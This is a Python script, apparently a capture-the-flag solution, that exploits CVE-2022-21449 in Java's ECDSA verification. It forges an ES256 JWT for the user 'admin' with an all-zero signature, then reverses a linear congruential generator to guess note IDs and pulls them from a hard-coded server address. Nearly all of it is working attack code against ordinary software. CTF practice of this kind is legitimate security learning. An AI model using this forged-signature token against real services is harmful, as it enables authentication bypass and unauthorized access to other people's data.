# CVE-2022-21449 https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
import asn1
import base64
import requests
import time

def gcdExtended(a, b): 
    if a == 0 :  
        return b,0,1
    gcd,x1,y1 = gcdExtended(b%a, a) 
    x = y1 - (b//a) * x1 
    y = x1 
    return gcd,x,y
      
class Rnd:
    def __init__(self,x):
        self.x = x
        self.M = 1<<63
        self.A = 6364136223846793005
        self.C = 1442695040888963407
    def prev(self):
        ainverse = gcdExtended(self.A, self.M)[1]
        self.x = (ainverse * ((self.x) - self.C)) & (self.M - 1)
        return self.x;

encoder = asn1.Encoder()
encoder.start()
encoder.enter(0x10)
encoder.write(0)
encoder.write(0)
encoder.leave()
encoded_bytes = encoder.output()

signature = base64.b64encode(encoded_bytes)
header = base64.b64encode(b'{"typ":"JWT","alg":"ES256"}').strip(b"=")
payload = base64.b64encode(b'{"username":"admin","iat":1650466502,"exp":1900470102}').strip(b"=")

token = header.decode() + "." + payload.decode() + "." + signature.decode()

rnd = Rnd(62221403078361557) # last seed at 18:55
r = requests.session()
header = {"Authorization" : "Bearer " + token}
url = 'http://159.223.83.0:8080/note/'
flag = ""

start = time.time()
while True:
    tmp = str(rnd.prev())
    tmp += '-admin'
    resp = r.get(url+tmp, headers = header)
    if(resp.text=='error'):
        continue
    else:
        resp = resp.text.split("\n")
        flag = resp[1] + flag
        if('ara2022' in flag):
            break
end = time.time()
print("Time : {}".format(end-start))
print("Flag : {}".format(flag[:flag.index('}')+1]))